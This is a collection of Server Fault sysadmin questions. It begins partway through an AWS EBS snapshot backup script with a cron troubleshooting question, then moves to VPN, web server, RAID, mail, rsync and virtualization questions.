    echo ""Tagging Snapshot $ec2_snapshot_resource_id with the following Tags: $snapshot_tags""
    tags_argument=""--tags $snapshot_tags""
    aws_ec2_create_tag_result=$(aws ec2 create-tags --resources $ec2_snapshot_resource_id --region $region $tags_argument --output text 2&gt;&amp;1)
  fi
}

get_date_binary() {
  #$(uname -o) (operating system) would be ideal, but OS X / Darwin does not support to -o option
  #$(uname) on OS X defaults to $(uname -s) and $(uname) on GNU/Linux defaults to $(uname -s)
  uname_result=$(uname)
  case $uname_result in
    Darwin) date_binary=""posix"" ;;
    FreeBSD) date_binary=""posix"" ;;
    Linux) date_binary=""linux-gnu"" ;;
    *) date_binary=""unknown"" ;;
  esac
}

get_purge_after_date_fe() {
case $purge_after_input in
  #any number of numbers followed by a letter ""d"" or ""days"" multiplied by 86400 (number of seconds in a day)
  [0-9]*d) purge_after_value_seconds=$(( ${purge_after_input%?} * 86400 )) ;;
  #any number of numbers followed by a letter ""h"" or ""hours"" multiplied by 3600 (number of seconds in an hour)
  [0-9]*h) purge_after_value_seconds=$(( ${purge_after_input%?} * 3600 )) ;;
  #any number of numbers followed by a letter ""m"" or ""minutes"" multiplied by 60 (number of seconds in a minute)
  [0-9]*m) purge_after_value_seconds=$(( ${purge_after_input%?} * 60 ));;
  #no trailing digits default is days - multiply by 86400 (number of minutes in a day)
  *) purge_after_value_seconds=$(( $purge_after_input * 86400 ));;
esac
#based on the date_binary variable, the case statement below will determine the method to use to determine ""purge_after_days"" in the future
case $date_binary in
  linux-gnu) echo $(date -d +${purge_after_value_seconds}sec -u +%s) ;;
  posix) echo $(date -v +${purge_after_value_seconds}S -u +%s) ;;
  *) echo $(date -d +${purge_after_value_seconds}sec -u +%s) ;;
esac
}

purge_EBS_Snapshots() {
  # snapshot_purge_allowed is a string containing the SnapshotIDs of snapshots
  # that contain a tag with the key value/pair PurgeAllow=true
  snapshot_purge_allowed=$(aws ec2 describe-snapshots --region $region --filters Name=tag:PurgeAllow,Values=true --output text --query 'Snapshots[*].SnapshotId')

  for snapshot_id_evaluated in $snapshot_purge_allowed; do
    #gets the ""PurgeAfterFE"" date which is in UTC with UNIX Time format (or xxxxxxxxxx / %s)
    purge_after_fe=$(aws ec2 describe-snapshots --region $region --snapshot-ids $snapshot_id_evaluated --output text | grep ^TAGS.*PurgeAfterFE | cut -f 3)
    #if purge_after_date is not set then we have a problem. Need to alert user.
    if [[ -z $purge_after_fe ]]; then
      #Alerts user to the fact that a Snapshot was found with PurgeAllow=true but with no PurgeAfterFE date.
      echo ""Snapshot with the Snapshot ID \""$snapshot_id_evaluated\"" has the tag \""PurgeAllow=true\"" but does not have a \""PurgeAfterFE=xxxxxxxxxx\"" key/value pair. $app_name is unable to determine if $snapshot_id_evaluated should be purged."" 1&gt;&amp;2
    else
      # if $purge_after_fe is less than $current_date then
      # PurgeAfterFE is earlier than the current date
      # and the snapshot can be safely purged
      if [[ $purge_after_fe &lt; $current_date ]]; then
        echo ""Snapshot \""$snapshot_id_evaluated\"" with the PurgeAfterFE date of \""$purge_after_fe\"" will be deleted.""
        aws_ec2_delete_snapshot_result=$(aws ec2 delete-snapshot --region $region --snapshot-id $snapshot_id_evaluated --output text 2&gt;&amp;1)
      fi
    fi
  done
}

#calls prerequisitecheck function to ensure that all executables required for script execution are available
prerequisite_check

app_name=$(basename $0)
#sets defaults
selection_method=""volumeid""
#date_binary allows a user to set the ""date"" binary that is installed on their system and, therefore, the options that will be given to the date binary to perform date calculations
date_binary=""""
#sets the ""Name"" tag set for a snapshot to false - using ""Name"" requires that ec2-create-tags be called in addition to ec2-create-snapshot
name_tag_create=false
#sets the ""InitiatingHost"" tag set for a snapshot to false
hostname_tag_create=false
#sets the user_tags feature to false - user_tag creates tags on snapshots - by default each snapshot is tagged with volume_id and current_date timestamp
user_tags=false
#sets the Purge Snapshot feature to false - if purge_snapshots=true then snapshots will be purged
purge_snapshots=false
#handles options processing

while getopts :s:c:r:v:t:k:pnhu opt; do
  case $opt in
    s) selection_method=""$OPTARG"" ;;
    c) cron_primer=""$OPTARG"" ;;
    r) region=""$OPTARG"" ;;
    v) volumeid=""$OPTARG"" ;;
    t) tag=""$OPTARG"" ;;
    k) purge_after_input=""$OPTARG"" ;;
    n) name_tag_create=true ;;
    h) hostname_tag_create=true ;;
    p) purge_snapshots=true ;;
    u) user_tags=true ;;
    *) echo ""Error with Options Input. Cause of failure is most likely that an unsupported parameter was passed or a parameter was passed without a corresponding option."" 1&gt;&amp;2 ; exit 64 ;;
  esac
done

#sources ""cron_primer"" file for running under cron or other restricted environments - this file should contain the variables and environment configuration required for ec2-automate-backup to run correctly
if [[ -n $cron_primer ]]; then
  if [[ -f $cron_primer ]]; then
    source $cron_primer
  else
    echo ""Cron Primer File \""$cron_primer\"" Could Not Be Found."" 1&gt;&amp;2 ; exit 70
  fi
fi

#if region is not set then:
if [[ -z $region ]]; then
  #if the environment variable $EC2_REGION is not set set to us-east-1
  if [[ -z $EC2_REGION ]]; then
    region=""us-east-1""
  else
    region=$EC2_REGION
  fi
fi

#sets date variable
current_date=$(date -u +%s)

#sets the PurgeAfterFE tag to the number of seconds that a snapshot should be retained
if [[ -n $purge_after_input ]]; then
  #if the date_binary is not set, call the get_date_binary function
  if [[ -z $date_binary ]]; then
    get_date_binary
  fi
  purge_after_date_fe=$(get_purge_after_date_fe)
  echo ""Snapshots taken by $app_name will be eligible for purging after the following date (the purge after date given in seconds from epoch): $purge_after_date_fe.""
fi

#get_EBS_List gets a list of EBS instances for which a snapshot is desired. The list of EBS instances depends upon the selection_method that is provided by user input
get_EBS_List

#the loop below is called once for each volume in $ebs_backup_list - the currently selected EBS volume is passed in as ""ebs_selected""
for ebs_selected in $ebs_backup_list; do
  ec2_snapshot_description=""ec2ab_${ebs_selected}_$current_date""
  ec2_snapshot_resource_id=$(aws ec2 create-snapshot --region $region --description $ec2_snapshot_description --volume-id $ebs_selected --output text --query SnapshotId 2&gt;&amp;1)
  if [[ $? != 0 ]]; then
    echo -e ""An error occurred when running ec2-create-snapshot. The error returned is below:\n$ec2_create_snapshot_result"" 1&gt;&amp;2 ; exit 70
  fi  
  create_EBS_Snapshot_Tags
done

#if purge_snapshots is true, then run purge_EBS_Snapshots function
if $purge_snapshots; then
  echo ""Snapshot Purging is Starting Now.""
  purge_EBS_Snapshots
fi
</code></pre>

<p>The cron primer file used is the following (cron-primer.sh)</p>

<pre><code>#!/bin/bash -
# EC2_HOME required for EC2 API Tools
export EC2_HOME=/usr/local/ec2/apitools
# JAVA_HOME required for EC2 API Tools
export JAVA_HOME=/usr/lib/jvm/java-7-openjdk-amd64/
# export PATH=/bin is required for cut, date, grep
# export PATH=/opt/aws/bin/ is required for EC2 API Tools
export PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/ec2/apitools/bin/
export AWS_ACCESS_KEY=XXXXXX
export AWS_SECRET_KEY=XXXXXX
# The environmental variable names seem to have changed
export AWS_ACCESS_KEY_ID=XXXXXX
export AWS_SECRET_ACCESS_KEY=XXXXXX
</code></pre>

<p>(Note that the only environmental variables that should be required are the AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY, but I left the others as they had been used by the older EC2 CLI implementation)</p>

<p>The script runs perfectly when done so directly from the console, but when I run the script from a cronjob it does not work. The following error is emailed:</p>

<pre><code>In order to use , the executable ""aws"" must be installed.
</code></pre>

<p>Note that this error is from the 8th line in the script. The message infers that the aws executable could not be found, but there is a symlink in /usr/local/bin to this file which is included in the PATH variable. Also, one can see that the $0 variable ($app_name) seems to be empty as it is not printing. (This same error printed correctly  when run from the console before I had AWS CLI installed properly, so I know there is no error in the script itself)</p>

<p>The crontab looks as follows:</p>

<pre><code>8 * * * * /usr/local/ec2/scripts/ec2-automate-backup.sh -r eu-west-1 -s tag -t ""Backup,Values=true"" -k 7 -p -n -c /usr/local/ec2/scripts/cron-primer.sh
</code></pre>

<p>Also, I would like to rather output the results of the script to a file, to do this I had the cronjob as </p>

<pre><code>8 * * * * /usr/local/ec2/scripts/ec2-automate-backup.sh -r eu-west-1 -s tag -t ""Backup,Values=true"" -k 1 -p -n -c /usr/local/ec2/scripts/cron-primer.sh &amp;&gt; /var/log/ebs_backup/ec2-automate-backup_`date +""%Y%m%d""`.log
</code></pre>

<p>Which did not create the file, if someone could highlight the reason for the file not being created (permissions in the destination folder is correct), it would be appreciated</p>
","<ubuntu><amazon-web-services><cron><amazon-ebs>","2016-02-04 10:15:12"
"930450","Access the internet directly while connected to VPN","<p>I'm using Pulse Secure on a Mac OS. When I connect to my company VPN I can access their servers but can't access any external website.</p>

<p>Is it possible to tinker with the VPN client to have access to both internet and local servers?</p>

<p>I've been searching around for info on VPN split tunneling and modifying the routing tables but now I feel stuck. Is there a solution that can be applied on the client side regardless of the VPN client?</p>
","<vpn><split-tunnel>","2018-09-11 16:39:10"
"851274","Why is magento so slow on Windows 10?","<p>When i install magento 2 on my Windows 10 WAMP/XAMPP, it runs so slow.</p>

<p>Is this some general problem of Magento with Windows? My laptop has 8GB RAM, 2x2.7 GHZ, 500GB HDD, 512MB VRAM.</p>

<p>Also same is on PC's at my office who has 8GB RAM and SSD, also on my friend's laptop with SSD and 8GB RAM...</p>

<p>What cause this? I tested with PHP7, MariaDB, everything i find on web (memory limits etc..), but it is always slow...</p>

<p>Is there any solution of this? If i install magento on Linux virtual machine it will be better?</p>

<p>Thanks.</p>
","<magento>","2017-05-20 15:49:37"
"851291","Make Apache2.4 listens only to a specific interface in systemd","<p>In a home network environment, I'm hosting a web server but my ISP keeps giving me different but dynamic IP address via DHCP (dhclient here).</p>

<p>The system is running systemd (and not rc.d initd).</p>

<p>How do I ensure that Apache 2.4 is ONLY listening to that interface (of changing IP addresses)?</p>

<p>Caveats:</p>

<ul>
<li>I don't want Apache 2.4 listening on my other 3 NIC interfaces (I've got a test network, a cable-provider network, and a WiFi network, each have their own web servers).</li>
<li>Firewall approach is not the best approach option here (besides Apache2 must know IP address somehow in advance and should selectively listen to a specified interface ... for compartmentability sake.)</li>
</ul>
","<apache-2.4><systemd>","2017-05-20 17:51:48"
"851304","A lot more write then read IO","<p><a href=""https://i.sstatic.net/c9n4j.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/c9n4j.png"" alt=""enter image description here""></a></p>

<p>As shown in the picture above we are having a lot more writes then reads on our appserver. Cache is enabled and the Framework is running with PHP/Symofony and using HTTP Cache.</p>

<p>Is this I/O behavior normal? I doubt it, since with the cache the server should read more and write less.</p>
","<cache><apache2><ubuntu-16.04><io><symfony>","2017-05-20 20:38:56"
"851349","NGINX macOS Sierra brew vs sudo","<p>I am encountering an issue with NGINX behaving differently with the following start commands:</p>

<pre><code>brew services start nginx
</code></pre>

<p>vs</p>

<pre><code>sudo nginx
</code></pre>

<p>When i start nginx with <code>sudo nginx</code>, everything seem to work normal.
But when I try to start nginx with <code>brew service start nginx</code>, it would start and work fine if I load pages I loaded before using <code>sudo nginx</code>, but anything new would not load. I would have to use <code>sudo nginx</code> to load that page first.</p>

<p><code>brew services list</code> shows the nginx as started, but the status is in yellow</p>

<pre><code>Name  Status  User    Plist
nginx started usera /Users/usera/Library/LaunchAgents/homebrew.mxcl.nginx.plist
php71 started usera /Users/usera/Library/LaunchAgents/homebrew.mxcl.php71.plist
</code></pre>

<p>Here's my <code>nginx.conf</code> file</p>

<pre><code>user usera admin;
worker_processes 1;

events {
    worker_connections 1024;
}

http {
    include mime.types;
    default_type application/octet-stream;

    sendfile on;

    keepalive_timeout 65;

    server {
        listen 8080;
        server_name localhost;

        location / {
            root html;
            index index.html index.htm;
        }

        error_page 500 502 503 504 /50x.html;
        location = /50x.html {
            root html;
        }
    }

    # Include Configuration
    #include conf.d/*.conf;

    # Include Enabled Sites
    include sites-enabled/*;

    include servers/*;
}
</code></pre>

<p><code>default</code> service configuration file</p>

<pre><code>server {
    listen 8080;
    server_name default.localhost;

    location / {
        root html/default;
        index index.html index.htm;
    }

    location ~ [^/]\.php(/|$) {
        fastcgi_split_path_info ^(.+?\.php)(/.*)$;

        fastcgi_pass 127.0.0.1:9000;
        fastcgi_index index.php;
        include fastcgi.conf;
    }
}
</code></pre>
","<nginx><mac-osx>","2017-05-21 06:09:09"
"851354","Virtual Disk 00 Shows Degraded for PowerEdgeR710: Does my Disk where okay?","<p>My Virtual Disk  State shows me Degraded and once i double click both the disk seems to me fine</p>

<p>Moreover, under Connector 0 my physical disk 0.0.0 showing Forign State.</p>

<p>I am new to this and can someone tell me whats going with my disk</p>

<p>Thank you</p>
","<raid><dell-poweredge><hardware-raid>","2017-05-21 07:06:28"
"851399","Creating VLANs or Subnets to simulate corporate environment","<p>I am currently using ESXi and a Dell R610 to simulate a 100% vitalized environment. It is going to be setup like a small company. I plan on having a webserver for the company, possibly email server, a extranet, intranet, DMZ, etc. This is going to be setup so I can practice ethical hacking and making my way from a few different options such as establishing foothold through a external web server, simulating being within the network as a employee, etc. My question would be should I be using subnets or VLANs to segment each network off? So like the web server should be able to communicate with everyone, but some private servers in the intranet of the company should not be accessed by the web server. So if someone were to gain access to the web server, they would need to keep pivoting deeper into the network until they get onto a box that has a link to the private servers. So should I be looking at VLANs or subnets for this?</p>
","<networking><virtualization><vlan><subnet>","2017-05-21 15:05:28"
"930606","Running VMWare Workstation 14 on a VM","<p>I have set up VMWare Workstation on a esxi 6.0 hosted VM. (Ubuntu 16.04.05)</p>

<p>I am trying to run some <code>packer</code> builds that use the specific (VMWare Workstation) hypervisor.</p>

<p>The builds get stuck  randomly;</p>

<p>The only thing I notice in my logs is:</p>

<pre><code>$ tail -f /var/log/vmware/hostd-1.log 
2018-09-12T19:10:43.227+03:00 info hostd[31791] [Originator@6876 sub=Libs] SOCKET creating new socket, connecting to /var/run/vmware/usbarbitrator-socket
2018-09-12T19:10:43.227+03:00 info hostd[31791] [Originator@6876 sub=Libs] SOCKET connect failed, error 2: No such file or directory
2018-09-12T19:12:43.228+03:00 info hostd[31791] [Originator@6876 sub=Libs] SOCKET creating new socket, connecting to /var/run/vmware/usbarbitrator-socket
</code></pre>

<p>What is more ...</p>

<pre><code>$ sudo systemctl status vmware-USBArbitrator.service
● vmware-USBArbitrator.service - LSB: This services starts and stops the USB Arbitrator.
   Loaded: loaded (/etc/init.d/vmware-USBArbitrator; bad; vendor preset: enabled)
   Active: failed (Result: exit-code) since Wed 2018-09-12 19:27:02 EEST; 12s ago
     Docs: man:systemd-sysv-generator(8)
  Process: 10639 ExecStart=/etc/init.d/vmware-USBArbitrator start (code=exited, status=1/FAILURE)

Sep 12 19:27:01 systemd[1]: Starting LSB: This services starts and stops the USB Arbitrator....
Sep 12 19:27:02 vmware-USBArbitrator[10639]: [11B blob data]
Sep 12 19:27:02 systemd[1]: vmware-USBArbitrator.service: Control process exited, code=exited status=1
Sep 12 19:27:02 systemd[1]: Failed to start LSB: This services starts and stops the USB Arbitrator..
Sep 12 19:27:02 systemd[1]: vmware-USBArbitrator.service: Unit entered failed state.
Sep 12 19:27:02 systemd[1]: vmware-USBArbitrator.service: Failed with result 'exit-code'.
</code></pre>

<p>Could it be that it is not possible (or at least some requirements should be met) to build a vm image on a VM guest?</p>

<p>Any suggestions?</p>
","<virtualization><vmware-esxi><vmware-workstation><packer>","2018-09-12 16:32:37"
"930724","nagios/nrpe user confined to certain dir on ubuntu","<p>I am confused. Not that is difficult to get me in a confused state, but I am so confused, that I don't know what my name is or where I live (like Baldrick!).</p>

<p>Anyway, I have nrpe installed on a client and everything works fine from the nagios server. Until I created my own simple plugin.</p>

<p>All it does is read a file from /tmp and echos its one-liner content. Except I get the <strong>NRPE: Unable to read output</strong> error.</p>

<p>I tried going the sudo route, but that did not work either. I logged in as the nagios user - the owner of the nrpe process - and the plugin works fine then.
But executing it from the nagios server does not work.</p>

<p>In the end, I moved the file from /tmp to /usr/lib/nagios/plugins/logs and now it works from the nagios server.</p>

<p>So, my question is, how does ubuntu limit the plugin to /usr/lib/nagios/plugins when the script is being executed from the nagios server, but when logged in locally as the nagios user, it has access to the file in /tmp?</p>
","<ubuntu><nagios><nrpe>","2018-09-13 10:27:32"
"851526","How to find which Process is causing High CPU usage","<p>Is there any way to find out from terminal which process is causing high CPU Usage ?</p>

<p>It would also be useful to order processes in descending order of cpu Usage</p>
","<linux>","2017-05-22 11:12:16"
"976582","How does Shopify manage hundreds of thousands domains to one IP","<p>I am wondering how does Shopify routes and provides SSL certificates for the hundred of thousands of domains that are pointed to their IP Address <code>23.227.38.32</code>.I am trying to build a similar service as Spotify and was wondering how to achieve this.After that,how does it curate the content for the specific domain.Does the web server look up the host domain and then render the appropriate content?</p>

<p>Many thanks!</p>
","<domain-name-system><routing><web-server><ip>","2019-07-24 21:17:58"
"930770","Process without name","<p>I have a web server, due to an outdated Wordpress some hacker uploaded a webshell. Throught it, he launched a process but the ps command is not showing any name for the process:</p>

<pre><code>root@serv ~ # ps aux|grep  "" 326 ""
us432   326  0.0  0.0  25032  4476 ?        S    Aug27   0:16       
root     3334  0.0  0.0  16656  2092 pts/2    S+   14:58   0:00 grep  326
</code></pre>

<p>Due to that fact I couldn't discover the problem until today.</p>

<p>The server OS is Debian 8, with Apache and PHP 7. The website is running under a non-privileged user.</p>

<p>I've search how to launch a process without name or how can I delete it's name during the execution but I didn't find anything. </p>

<p>Does anyone know how is this possible?</p>

<p>Thanks in advanced.</p>
","<linux><process><malware>","2018-09-13 15:10:30"
"851572","Migrating from linux shared server to Azure","<p>I have 5 existing wordpress websites running on a linux shared hosting. The most acessed one has the maximum of 10000 page views/day and 500 page views/day on average. The others have few page views.</p>

<p>How can I migrate those existing websites to Azure, keeping cost and simplicity in mind?
Maybe creating a ubuntu server vm or centos server vm, but I never managed a linux server before.</p>
","<linux><azure><migration><shared-hosting>","2017-05-22 14:52:24"
"976635","List of active users and their access rights to O.S. in Windows Server 2003","<p>How I can get a list of active users and their profiles (access rights) to O.S. in Windows Server 2003 ?</p>
","<windows-server-2003><user-management><user-permissions>","2019-07-25 07:55:22"
"851631","Co-location: How to be sure the DC does not replace my server","<p>I'm planning to purchase an expensive server and send it to a datacenter to co-locate.
As this is my first server, there is a question in my mind and would be appreciated if you answer it.
How could I be sure the datacenter will not replace my server with a used (in stock) server? Is there any way such as checking serial number or something else to make sure the server is exactly the one that I sent to DC?</p>
","<datacenter><colocation>","2017-05-22 19:57:00"
"976674","What is the VPC accepted address and why","<p>i am trying to create a vpc but the ip i am providing is not accepted which is 192.168.1.1/16 but aws says i can use the following range if i set to 192.168.0.0/16 it works , i guess to an extent still some clarity would be great</p>

<pre><code>When you create a VPC, we recommend that you specify a CIDR block (of /16 or smaller) from the private IPv4 address ranges as specified in RFC 1918:

10.0.0.0 - 10.255.255.255 (10/8 prefix)

172.16.0.0 - 172.31.255.255 (172.16/12 prefix)

192.168.0.0 - 192.168.255.255 (192.168/16 prefix)
</code></pre>
","<amazon-web-services><ip><subnet><amazon-vpc><cidr>","2019-07-25 12:16:07"
"851695","How should I disable application logs into syslog?","<p>I have many services that floods syslog file in <code>/var/log</code> with tons of messages. Sometime server restart all of a sudden and when I created a ticket about the issue, they said that the problem is related to the heavy use of the emulated serial port. By default, the emulated serial port receives the kernel log messages.</p>

<p>On my server <code>dmseg</code> is empty, but <code>syslog</code> has many logs written into. I think I have to disable this feature. Now I tried the below command to disable it:</p>

<pre><code>dmesg -D
</code></pre>

<p>or this command:</p>

<pre><code>sudo dmesg -n 1
</code></pre>

<p>But logs are written into syslog. How should I disable syslog logging, or to disable some services from writing into syslog?</p>
","<linux><syslog><dmesg>","2017-05-23 06:26:11"
"976750","Is it possible to enable starting a custom Ubuntu service without root access?","<p>I'm the only software developer in my company. I deployed a .NET Core 2.2 web application on Ubuntu 18.04 with several utilities for my coworkers, and to keep the application running, I installed the application as a service. All of this is working fine.</p>

<p>I'm currently working on automating my deployment and update workflow. Currently, the entire process is automated via PowerShell and bash scripts (developing on Windows 10) <strong>except</strong> restarting the application service after deployment, because this requires root access to achieve <strong>as far as I know</strong>.</p>

<p>I understand that it is possible to enable the use of <code>sudo</code> without a password. This is not what I'm trying to achieve at the moment (although this is an acceptable fallback since the application is hosted on our intranet and the application is trivial in nature). Given service name <code>my-app.service</code>, I would like to execute</p>

<p><code>systemctl restart my-app</code></p>

<p>rather than</p>

<p><code>sudo systemctl restart my-app</code></p>

<p>to enable adding the restart command to my PowerShell script on the development machine. The service is trivial in nature, and nothing that it does requires root access. The app is hosted in my home directory and all permissions are set correctly. The service simply runs the <code>app.dll</code> using the <code>dotnet</code> executable. I currently access the deployment machine via SSH and restart the service manually, but I would prefer not to do this if at all possible.</p>

<p>This is the service file. (I prefer hosting websites from a user's home directory, so that part is correct for my configuration - as I said, everything works the way it is <strong>expected</strong> to work, just not the way I <strong>want</strong>.)</p>

<pre><code>[Unit]
Description=Some inhouse tool for --Company Name--

[Service]
WorkingDirectory=/home/username/website.com
ExecStart=/usr/bin/dotnet /home/username/website.com/app.dll
Restart=always
RestartSec=10
KillSignal=SIGINT
SyslogIdentifier=--Company Name--app
User=username
Environment=ASPNETCORE_ENVIRONMENT=Production
Environment=DOTNET_PRINT_TELEMETRY_MESSAGE=false

[Install]

WantedBy=multi-user.target
</code></pre>

<p>I have tried searching ServerFault, AskUbuntu, Unix&amp;Linux, and the web at large, to no avail. I've looked through literally hundreds of questions (over 200 at last count) that may have been related, but most of those questions either weren't related, or wanted to circumvent entering a password on <code>sudo</code> instead of circumventing <code>sudo</code> altogether. If the answer did slip through the cracks, I apologize in advance.</p>
","<ubuntu><service>","2019-07-25 20:41:20"
"976793","How to transfer domain to a new Hosting provider while keeping emails on old Hosting provider?","<p>So let's say I have a website hosted in Yahoo Small Business with the domain name of 'website.com' as well as emails associated with the domain name, for instance 'email@website.com'.</p>

<p>How would I move the domain name 'website.com' to a different host such as Bluehost, while still retaining the email services at Yahoo Small Business?</p>
","<email><domain><host>","2019-07-26 07:04:47"
"931012","rsync file size discrepancies","<p>I have a few PC's with an ext4 filesystem that I want to backup to a file server which is also ext4. Problem is there are some discrepancies in file sizes when using rsync, and I have noticed this is due to sparse files. </p>

<p>The problem is I want to create an exact rsync copy of the filesystem using rsync over a network to keep weekly backups, in case I need to restore, and the restored data should be the same size as whats running on the PC.</p>

<p>Creating the test files, 1 sparse and 1 not:</p>

<pre><code>mkdir testing
dd if=/dev/zero of=testing/sparse-file.img bs=1 count=0 seek=5M
cp testing/sparse-file.img testing/non-sparse-file.img --sparse=never
</code></pre>

<p>Rsync with and without sparse option:</p>

<pre><code>mkdir testa testb
rsync testing/* testa
rsync --sparse testing/* testb
</code></pre>

<p>Results:</p>

<pre><code>du -h
5.1M    ./testing
4.0K    ./testb
11M     ./testa
16M     .
</code></pre>

<p><em>testing</em> has 1 file 5MB and one sparse file,
<em>testb</em> had both files become sparse,
<em>testa</em> had both files become non-sparse</p>

<p>But how do I make rsync maintain the file sparseness? So the filesystem will have the exact same size on the restored system.</p>

<p>I want to have certainty when I restore my system I'll know exactly how big the restored data will be, with sparse option, my restored system is going to be more sparse then what it was originally (I guess this is acceptable), and with the non-sparse option, this will result in an unpredictable larger restored system.</p>
","<linux><filesystems><rsync><ext4>","2018-09-15 04:14:33"
"851877","Mail doesn't work in Debian","<p>So I'm trying to launch mail() function in PHP, so I installed mail (mailutilities as well) package into my debian server. When I'm trying to send the email I don't get it.</p>

<p>Here's what log says:</p>

<pre><code>May 23 22:22:50 raspberrypi sm-msp-queue[1299]: My unqualified host name (raspberrypi) unknown; sleeping for retry
May 23 22:23:16 raspberrypi sendmail[1530]: My unqualified host name (raspberrypi) unknown; sleeping for retry
May 23 22:23:59 raspberrypi sm-mta[819]: unable to qualify my own domain name (raspberrypi) -- using short name
May 23 22:23:59 raspberrypi sm-mta[1534]: starting daemon (8.14.4): SMTP+queueing@00:10:00
May 23 22:24:00 raspberrypi sm-msp-queue[1299]: unable to qualify my own domain name (raspberrypi) -- using short name
May 23 22:24:16 raspberrypi sendmail[1530]: unable to qualify my own domain name (raspberrypi) -- using short name
May 23 22:24:16 raspberrypi sendmail[1530]: v4NJOGSk001530: from=www-data, size=239, class=0, nrcpts=1, msgid=&lt;2017052319                                               24.v4NJOGSk001530@raspberrypi&gt;, relay=www-data@localhost
May 23 22:24:16 raspberrypi sm-mta[1553]: v4NJOGcp001553: from=&lt;www-data@raspberrypi&gt;, size=458, class=0, nrcpts=1, msgid                                               =&lt;201705231924.v4NJOGSk001530@raspberrypi&gt;, proto=ESMTP, daemon=MTA-v4, relay=localhost [127.0.0.1]to
May 23 22:24:17 raspberrypi sendmail[1530]: v4NJOGSk001530: to=hiding_my_real_emailgmail.com, ctladdr=www-data (33/33), dela                                               y=00:00:01, xdelay=00:00:01, mailer=relay, pri=30239, relay=[127.0.0.1] [127.0.0.1], dsn=2.0.0, stat=Sent (v4NJOGcp001553                                                Message accepted for delivery)
</code></pre>

<p>My email box keeps being empty. Do I need to configure SMTP server on my server or smth?</p>
","<linux><debian><email>","2017-05-23 20:05:32"
"754143","How to Map Network Drives Using Logon Scripts & Group Policy Objects?","<p>I want to know how do I map network drives using the logon script method and the group policy objects method? If anyone could post me a in depth answer for going about these methods and explaining the reasoning behind it in a easy to understand I would really appreciate that. Thanks and I look forward to hearing from you!</p>

<p>P.S. I'm also using Windows Server 2012 r2</p>
","<windows><networking><active-directory>","2016-02-04 22:39:19"
"851909","Where to store db backups in centos 7?","<p>Where should I store my db backups in Centos 7? Are there any best practice for this? </p>

<p>Should I put them in <code>/var/lib/&lt;app&gt;/backups</code> as suggested in <a href=""https://askubuntu.com/a/754155"">this</a> answer? </p>
","<centos><database-backup>","2017-05-24 01:44:00"
"754157","Find network percentage of NIC","<p>So I have created a Linux resource monitoring tool that pulls various resource information. One of the fields I am trying to pull is the percent of network throughput on my NIC. So if I have a 1 Gb(bit) NIC with 200 Mb(bit) being processed every second, the tool would display 20%. Basic calculations are below as an example.</p>

<pre><code>sar -n DEV 1 1 #Used to pull Rx and Tx KB(byte) per second.
</code></pre>

<p>From here lets say it reports a total of 17000 KB(bytes). I then need to convert this to Kb(bits). So I would do the following.</p>

<pre><code>17000 * 8
</code></pre>

<p>This gives me a total of 136000 Kb(bits). I need to turn this into Mb(bits) to get a percentage from my actual NIC speed.</p>

<pre><code>136000 / 1000
</code></pre>

<p>I divide by 1000 to change this into Mb(bits). Total is now 136 Mb. From here I need to get a percentage based on my NIC. I have a 1Gb(bit) NIC.</p>

<pre><code>136 / 1000 (NIC speed in Mb) * 100
</code></pre>

<p>This equals 13.6%</p>

<p>So a rough calculation would tell me that my NIC is processing 13.6% of what it is said to be able to process by the vendor.</p>

<p>My questions are below. If this is the wrong site, please forward me on as this is part networking, part math, and part Linux/OS reporting so I wasn't sure what to use. Thank you</p>

<ol>
<li>Is my reasoning flawed? For example, is my math correct on how I retrieve my percentage</li>
<li>Obviously I would never get to 100% (theoretical), but wouldn't this information be useful for spotting a potential chokepoint in the network?</li>
<li>What are the Pro's and Con's of displaying this information in my tool? I have heard people say this is pointless and error prone, but I have never understood their reasoning.</li>
</ol>
","<linux><networking><bash><linux-networking><system-monitoring>","2016-02-04 23:18:40"
"931196","A CNAME record can't be set up for the domain root","<p>I recently bought a new domain from namecheap and decided to delegate it to Yandex.Connect services, so I changed namecheap's DNS to custom, added Yandex' nameservers (<code>dns1.yandex.net</code> and <code>dns2.yandex.net</code>) in the control panel, added the proof and within a couple hours my domain was being managed by Yandex.</p>

<p>Since I am hosting a personal site in my own premises and since my ISP doesn't sell any static IPs I decided to use DDNS. But when I tried to add a CNAME for <code>@</code> that points to <code>my-domain.example-ddns.org</code> I found out it does... nothing. The record just isn't being created. I tried adding another one for a subdomain and it works perfectly fine.</p>

<p>After reading <a href=""https://yandex.com/support/domain/domain/dns.html#dns__dns-editor"" rel=""nofollow noreferrer"">Yandex' guides</a> I read this:</p>

<blockquote>
  <p>CNAME. Remember that a CNAME record can't be set up for the domain root, because this is prohibited by the RFC.</p>
</blockquote>

<p>Imagine my shock when I read such a thing, when at the same time I have another domain registered with namecheap, but using namecheap's basic DNS instead, where I set up a CNAME record for @ that points to <code>my-other-domain.example-ddns.org</code> and it works perfectly fine! </p>

<p>How do I work around this? Using an A record is a no-go since I can't get an static IP.</p>
","<domain-name-system><cname-record><namecheap>","2018-09-16 23:17:50"
"754186","How can I find what file/user is consuming all the bandwidth on an SMB share?","<p>I manage a windows server (2012 R2) that has an SMB share used by people across my company. Recently, people have been complaining that the share is slow, and I'm seeing that the network bandwidth is completely saturating the NICs. I can see the number of files opened per user/session connected to the share, but I can't see bandwidth used by users or files. I suspect there are some automated scripts pulling files off the share and are misbehaving, but I don't know how to show this.</p>

<p>Are there any tools for dealing with this sort of problem?</p>
","<windows><bandwidth><server-message-block>","2016-02-05 04:35:02"
"852080","Why do Hard Drives have multiple platters?","<p>From what I've read, the read/write heads over each platter move in unison, so why are there multiple platters?</p>

<p>Is data split over each platter, so that instead of reading, say, 40 bytes from one platter, 10 bytes from 4 platters can be read, quicker?</p>
","<drive>","2017-05-24 19:43:27"
"931279","DirectX or Hyper-V In google cloud?","<p>Okay so basically i want to run some programs thath need Directx , a good alternative would be RemoteFX with Hyper-V but google cloud plataform dosnt support Hyper-V. And RDP dosnt support Directx. I do have any alternative for succesfully running those? Or its impossible?</p>

<p>I already try installing Hyper-V and i always get : ""a hypervisor is already running or the host server isnt compatible with Hyper-V"" </p>

<p>I also try using anydesk/teamviewer but i realize thaths pretty useless cause you just connect with them to the RDP session, once you close the sesion, its the same. And if you dont close, you are just getting in the RDP. Same issue.</p>

<p>I also try installing all type of drivers also the GRID of nvidia, but nothing worked. Im already desesperated , if someone can help me out. Would be insane.</p>
